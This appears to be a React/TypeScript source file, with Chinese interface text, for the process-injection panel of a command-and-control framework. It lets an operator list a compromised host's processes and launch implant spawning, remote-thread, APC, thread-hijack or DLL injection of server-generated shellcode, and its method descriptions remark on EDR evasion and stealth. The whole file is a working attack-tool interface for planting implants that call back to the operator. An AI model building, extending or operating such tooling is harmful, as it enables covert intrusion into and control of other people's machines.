import { useState, useEffect, useRef, useCallback } from 'react'
import { Search, RefreshCw, Upload, Play, AlertCircle, CheckCircle2, X, Zap } from 'lucide-react'
import { sessionApi } from '../api'
import type { Session } from '../types'
import './ProcessInjection.css'

// ─── 类型定义 ──────────────────────────────────────────────────────────────────

type ProcessInfo = {
  pid: number
  name: string
  path: string
  arch: string
  user: string
}

type InjectionMethod = 'spawn' | 'remote_thread' | 'apc' | 'thread_hijack' | 'dll'

type ExecutionStatus = 'idle' | 'running' | 'success' | 'error'

interface MethodDesc {
  label: string
  badge: string
  badgeClass: string
  description: string
}

const INJECTION_METHODS: Record<InjectionMethod, MethodDesc> = {
  spawn: {
    label: '进程生成上线 (Spawn)',
    badge: '推荐',
    badgeClass: 'badge-stealth',
    description: '【推荐/最可靠】服务端编译 implant EXE，通过当前会话发送给目标机并以子进程方式启动，无需选择 PID。绕过内存注入的所有不稳定因素，100% 保证新会话上线。',
  },
  remote_thread: {
    label: '远程线程注入 (Remote Thread)',
    badge: '标准',
    badgeClass: 'badge-standard',
    description: '最经典的方法。在目标进程分配内存，写入 Shellcode，通过 CreateRemoteThread 创建新线程执行。易被 EDR 检测。',
  },
  apc: {
    label: '异步过程调用 (APC Injection)',
    badge: '隐蔽',
    badgeClass: 'badge-stealth',
    description: '利用 Windows APC 机制，通过 QueueUserAPC 将代码插入目标线程队列。目标线程进入可警报等待状态时触发执行，比远程线程更隐蔽。',
  },
  thread_hijack: {
    label: '线程劫持 (Thread Hijacking)',
    badge: '高阶',
    badgeClass: 'badge-expert',
    description: '挂起目标现有线程，修改其指令指针 (RIP/EIP) 指向 Shellcode，恢复后劫持线程执行代码，不创建新线程，隐蔽性较好。',
  },
  dll: {
    label: 'DLL 注入 (DLL Injection)',
    badge: '文件',
    badgeClass: 'badge-advanced',
    description: '通过 LoadLibrary 将 DLL 注入运行中的进程。需要提供 DLL 文件，DLL 将以 Base64 编码传输后写入目标磁盘并加载。',
  },
}

// ─── 辅助组件：进程选择下拉框 ────────────────────────────────────────────────────

interface ProcessSelectorProps {
  processes: ProcessInfo[]
  value: string
  onChange: (v: string) => void
  onSelect: (p: ProcessInfo) => void
  loading: boolean
  onRefresh: () => void
  placeholder?: string
}

function ProcessSelector({ processes, value, onChange, onSelect, loading, onRefresh, placeholder }: ProcessSelectorProps) {
  const [open, setOpen] = useState(false)
  const ref = useRef<HTMLDivElement>(null)

  const filtered = value
    ? processes.filter(p =>
        p.pid.toString().includes(value) ||
        p.name.toLowerCase().includes(value.toLowerCase()) ||
        p.path.toLowerCase().includes(value.toLowerCase()))
    : processes

  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false)
    }
    document.addEventListener('mousedown', handler)
    return () => document.removeEventListener('mousedown', handler)
  }, [])

  return (
    <div className="proc-selector" ref={ref}>
      <div className="proc-input-row">
        <div className="proc-input-wrap">
          <Search size={15} className="proc-search-icon" />
          <input
            className="proc-input"
            placeholder={placeholder || '🔍 输入 PID 或进程名...'}
            value={value}
            onChange={e => { onChange(e.target.value); setOpen(true) }}
            onFocus={() => setOpen(true)}
          />
          {value && (
            <button className="proc-clear" onClick={() => { onChange(''); setOpen(false) }}>
              <X size={13} />
            </button>
          )}
        </div>
        <button className="proc-refresh" onClick={onRefresh} disabled={loading} title="刷新进程列表">
          <RefreshCw size={14} className={loading ? 'spin' : ''} />
        </button>
      </div>

      {open && (
        <div className="proc-dropdown">
          {loading ? (
            <div className="proc-empty">加载进程列表中...</div>
          ) : filtered.length === 0 ? (
            <div className="proc-empty">
              {value ? `未找到匹配 "${value}" 的进程` : '暂无进程数据，请点击刷新'}
            </div>
          ) : (
            <div className="proc-list">
              {filtered.map(p => (
                <div key={p.pid} className="proc-item" onClick={() => { onSelect(p); setOpen(false) }}>
                  <div className="proc-item-main">
                    <span className={`proc-arch-badge arch-${p.arch === 'x64' ? 'x64' : 'x86'}`}>{p.arch || 'x64'}</span>
                    <span className="proc-pid">PID: {p.pid}</span>
                    <span className="proc-name">{p.name}</span>
                  </div>
                  <div className="proc-item-path">{p.path || '路径未知'}</div>
                </div>
              ))}
            </div>
          )}
          <div className="proc-hint">支持手动输入任意 PID 或完整可执行文件路径</div>
        </div>
      )}
    </div>
  )
}

// ─── 辅助组件：方法说明卡片 ────────────────────────────────────────────────────

function MethodInfoCard({ desc }: { desc: MethodDesc }) {
  return (
    <div className="method-info-card">
      <AlertCircle size={14} className="method-info-icon" />
      <p className="method-info-text">{desc.description}</p>
    </div>
  )
}

// ─── 辅助组件：执行结果提示 ─────────────────────────────────────────────────────

function StatusBar({ status, message }: { status: ExecutionStatus; message: string }) {
  if (status === 'idle') return null
  const map = {
    running: { cls: 'status-running', icon: <RefreshCw size={14} className="spin" /> },
    success: { cls: 'status-success', icon: <CheckCircle2 size={14} /> },
    error:   { cls: 'status-error',   icon: <AlertCircle size={14} /> },
  }
  const { cls, icon } = map[status] || map.running
  return (
    <div className={`status-bar ${cls}`}>
      {icon}
      <span>{message}</span>
    </div>
  )
}

// ─── 主组件 ──────────────────────────────────────────────────────────────────────

export function ProcessInjectionTab({ session }: { session: Session }) {
  const [processes, setProcesses] = useState<ProcessInfo[]>([])
  const [procLoading, setProcLoading] = useState(false)

  // 注入状态
  const [injectMethod, setInjectMethod]     = useState<InjectionMethod>('spawn')
  const [injectTarget, setInjectTarget]     = useState('')
  const [injectPid, setInjectPid]           = useState<number | null>(null)
  const [dllFile, setDllFile]               = useState<File | null>(null)
  const [dragOver, setDragOver]             = useState(false)

  // 执行状态
  const [status, setStatus]                 = useState<ExecutionStatus>('idle')
  const [statusMsg, setStatusMsg]           = useState('')

  // ── 获取进程列表 ─────────────────────────────────────────────────────────────

  const pollTask = async (taskId: number): Promise<string | null> => {
    // 动态轮询间隔：前几次快速探测，之后拉长，减少无效请求
    const intervals = [0, 200, 300, 500, 1000, 2000]
    for (let i = 0; i < 30; i++) {
      try {
        const r = await fetch(`/api/v1/tasks/${taskId}`, {
          headers: { Authorization: `Bearer ${localStorage.getItem('toshell-token')}` },
        })
        const t = await r.json()
        if (t.status === 'completed') return t.output || '操作完成'
        if (t.status === 'failed')    return null
      } catch (_) {}
      await new Promise(res => setTimeout(res, intervals[Math.min(i, intervals.length - 1)]))
    }
    return null
  }

  const parseProcesses = (output: string): ProcessInfo[] => {
    try {
      const json = JSON.parse(output)
      if (Array.isArray(json)) return json as ProcessInfo[]
      if (json.processes) return json.processes as ProcessInfo[]
    } catch (_) {}

    const lines = output.split('\n')
    const result: ProcessInfo[] = []
    for (const line of lines) {
      const t = line.trim()
      if (!t || t.startsWith('PID') || t.startsWith('---')) continue
      const m = t.match(/^(\d+)\s+(.+)$/)
      if (m) {
        result.push({ pid: parseInt(m[1]), name: m[2].trim(), path: '', arch: session.arch || 'x64', user: '' })
      }
    }
    return result
  }

  const fetchProcesses = useCallback(async () => {
    setProcLoading(true)
    try {
      const res = await sessionApi.listProcesses(session.id)
      if (res?.data?.task_id) {
        const out = await pollTask(res.data.task_id)
        if (out) setProcesses(parseProcesses(out))
      }
    } catch (e) {
      console.error('fetch processes failed', e)
    }
    setProcLoading(false)
  }, [session.id])

  useEffect(() => { fetchProcesses() }, [fetchProcesses])

  // ── 进程选择处理 ──────────────────────────────────────────────────────────────

  const handleInjectSelect = (p: ProcessInfo) => {
    setInjectTarget(`[PID: ${p.pid}] ${p.name}`)
    setInjectPid(p.pid)
  }
  const handleInjectChange = (v: string) => {
    setInjectTarget(v)
    const m = v.match(/\[PID:\s*(\d+)\]/)
    setInjectPid(m ? parseInt(m[1]) : null)
  }

  // ── DLL 文件处理 ──────────────────────────────────────────────────────────────

  const fileToBase64 = (file: File): Promise<string> =>
    new Promise((res, rej) => {
      const reader = new FileReader()
      reader.readAsDataURL(file)
      reader.onload  = () => res((reader.result as string).split(',')[1])
      reader.onerror = rej
    })

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault()
    setDragOver(false)
    const f = e.dataTransfer.files?.[0]
    if (f?.name.endsWith('.dll')) setDllFile(f)
    else alert('请拖入 .dll 文件')
  }

  // ── 执行注入 ──────────────────────────────────────────────────────────────────

  const executeInjection = async () => {
    // spawn 模式不需要 PID
    if (injectMethod !== 'spawn' && !injectTarget) return

    let pid: number | null = null
    if (injectMethod !== 'spawn') {
      pid = injectPid ?? (() => {
        const m = injectTarget.match(/^\d+$/)
        return m ? parseInt(m[0]) : null
      })()

      if (!pid) {
        alert('请从列表选择进程或直接输入有效 PID')
        return
      }
    }

    setStatus('running')

    if (injectMethod === 'spawn') {
      setStatusMsg('⚙️ 正在编译并发送 implant EXE，新会话即将上线...')
    } else {
      setStatusMsg('正在生成 Shellcode 并下发注入任务...')
    }

    try {
      let response: any
      if (injectMethod === 'dll') {
        if (!dllFile) { alert('请先上传 DLL 文件'); setStatus('idle'); return }
        const b64 = await fileToBase64(dllFile)
        response = await sessionApi.processInject(session.id, injectMethod, pid!, undefined, b64)
      } else if (injectMethod === 'spawn') {
        // spawn: PID 传 0，服务端会忽略它
        response = await sessionApi.processInject(session.id, 'spawn', 0, undefined, undefined)
      } else {
        response = await sessionApi.processInject(session.id, injectMethod, pid!, undefined, undefined)
      }

      if (response?.data?.task_id) {
        const out = await pollTask(response.data.task_id)
        if (out) {
          setStatus('success')
          if (injectMethod === 'spawn') {
            setStatusMsg(`✅ implant EXE 已发送并启动！\n${out}\n\n⏳ 新会话正在上线中，请稍候（约 5-10 秒）...`)
          } else if (injectMethod === 'dll') {
            setStatusMsg(`✅ DLL 注入完成，目标 PID: ${pid}\n${out}`)
          } else {
            const shellcodeGenerated = response.data.shellcode_generated
            if (shellcodeGenerated) {
              setStatusMsg(`✅ Shellcode 已注入目标进程 PID: ${pid}\n${out}\n\n⏳ 等待新会话上线中...（注入的 implant 正在尝试回连服务器，请稍候）`)
            } else {
              setStatusMsg(`✅ 注入完成，目标 PID: ${pid}\n${out}`)
            }
          }
        } else {
          setStatus('error')
          setStatusMsg('❌ 注入执行失败，请检查目标进程权限和架构匹配（需要与目标进程位数一致）')
        }
      }
    } catch (e: any) {
      setStatus('error')
      setStatusMsg('❌ 请求失败: ' + (e?.response?.data?.error || e.message))
    }
  }

  // ── 渲染 ──────────────────────────────────────────────────────────────────────

  const injDesc = INJECTION_METHODS[injectMethod]

  return (
    <div className="pi-root">
      {/* ── 标题栏 ── */}
      <div className="pi-mode-bar">
        <div className="pi-mode-btn pi-mode-active">
          <Zap size={15} />
          进程注入 (Process Injection)
        </div>
      </div>

      <div className="pi-body">
        {/* 方法选择 */}
        <div className="pi-section">
          <div className="pi-label">选择注入方法</div>
          <div className="pi-method-grid">
            {(Object.keys(INJECTION_METHODS) as InjectionMethod[]).map(k => {
              const d = INJECTION_METHODS[k]
              return (
                <div
                  key={k}
                  className={`pi-method-card ${injectMethod === k ? 'pi-method-selected' : ''}`}
                  onClick={() => setInjectMethod(k)}
                >
                  <div className="pi-method-top">
                    <span className="pi-method-name">{d.label.split(' (')[0]}</span>
                    <span className={`pi-badge ${d.badgeClass}`}>{d.badge}</span>
                  </div>
                  <div className="pi-method-sub">{d.label.match(/\(([^)]+)\)/)?.[1]}</div>
                </div>
              )
            })}
          </div>
          <MethodInfoCard desc={injDesc} />
        </div>

        {/* 目标进程 - spawn 模式不需要 */}
        {injectMethod !== 'spawn' && (
          <div className="pi-section">
            <div className="pi-label">选择目标进程</div>
            <ProcessSelector
              processes={processes}
              value={injectTarget}
              onChange={handleInjectChange}
              onSelect={handleInjectSelect}
              loading={procLoading}
              onRefresh={fetchProcesses}
            />
          </div>
        )}

        {/* 载荷配置 */}
        <div className="pi-section">
          <div className="pi-label">载荷配置</div>

          {injectMethod === 'dll' ? (
            <div
              className={`dll-zone ${dragOver ? 'dll-zone-over' : ''} ${dllFile ? 'dll-zone-ready' : ''}`}
              onDragOver={e => { e.preventDefault(); setDragOver(true) }}
              onDragLeave={() => setDragOver(false)}
              onDrop={handleDrop}
            >
              <input
                id="dll-input"
                type="file"
                accept=".dll"
                className="dll-file-input"
                onChange={e => {
                  const f = e.target.files?.[0]
                  if (f?.name.endsWith('.dll')) setDllFile(f)
                  else alert('请选择 .dll 文件')
                }}
              />
              <label htmlFor="dll-input" className="dll-label">
                {dllFile ? (
                  <>
                    <CheckCircle2 size={22} color="#4ade80" />
                    <span className="dll-name">{dllFile.name}</span>
                    <span className="dll-size">{(dllFile.size / 1024).toFixed(1)} KB</span>
                    <span className="dll-change">点击更换文件</span>
                  </>
                ) : (
                  <>
                    <Upload size={22} />
                    <span>点击选择或拖拽 .dll 文件至此</span>
                    <span className="dll-hint">文件将以 Base64 编码传输，无需目标机器有该文件</span>
                  </>
                )}
              </label>
            </div>
          ) : injectMethod === 'spawn' ? (
            <div className="auto-payload-box">
              <CheckCircle2 size={16} color="#4ade80" />
              <span>🚀 服务端自动编译 implant EXE 并通过当前会话发送，目标机以子进程方式在后台启动，<strong>无需选择目标 PID，直接点击执行</strong></span>
            </div>
          ) : (
            <div className="auto-payload-box">
              <CheckCircle2 size={16} color="#4ade80" />
              <span>⚙️ 自动使用当前会话配置生成 Shellcode <span className="auto-tip">（推荐，服务端动态生成，无需手动配置）</span></span>
            </div>
          )}
        </div>

        {/* 状态与执行 */}
        <StatusBar status={status} message={statusMsg} />
        <div className="pi-footer">
          <button
            className="pi-exec-btn"
            disabled={status === 'running' || (injectMethod !== 'spawn' && !injectTarget)}
            onClick={executeInjection}
          >
            {status === 'running'
              ? <><RefreshCw size={15} className="spin" /> 执行中...</>
              : <><Play size={15} /> {injectMethod === 'spawn' ? '生成并上线' : '执行注入'}</>}
          </button>
          {status !== 'idle' && (
            <button className="pi-reset-btn" onClick={() => setStatus('idle')}>
              重置
            </button>
          )}
        </div>
      </div>
    </div>
  )
}
